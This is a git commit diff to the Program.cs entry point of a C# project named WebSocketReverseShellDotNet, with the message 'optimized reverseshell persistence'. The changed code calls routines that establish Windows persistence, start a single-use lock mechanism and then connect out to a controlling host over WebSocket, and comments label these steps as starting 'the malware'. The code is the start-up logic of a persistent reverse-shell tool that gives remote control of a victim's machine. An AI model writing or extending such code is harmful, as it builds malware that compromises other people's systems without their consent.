85c71748a95051e1c0d043056d719f27a3170aec
Mohammed Hattab <mohammedhattab97@gmail.com>
2023-12-22 20:07:13 -0500

    optimized reverseshell persistence

--- Program.cs
+++ Program.cs
@@ -7,19 +7,25 @@ using System.Windows.Forms;
 using WebSocketReverseShellDotNet.service.commands;
 using WebSocketReverseShellDotNet.utils;
 
-/*
-Encrypt encrypt = new Encrypt();
-encrypt.ExecuteCommand("");
-*/
 
 
 
-
-PersistsMalware.CreatePersistenceWindows();
-LockMechanismUtil.StartLockMechanism();
 ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
+
+
+// try to establish a persistent in the system
+PersistsMalware.CreatePersistenceWindows();
+// initiate lock mechanism to prevent malware from being used more than once
+LockMechanismUtil.StartLockMechanism();
+
+
+// start the malware
 WebSocketClient.ConnectToHost();
 
 
 Environment.Exit(0);
+
+
+
+
 
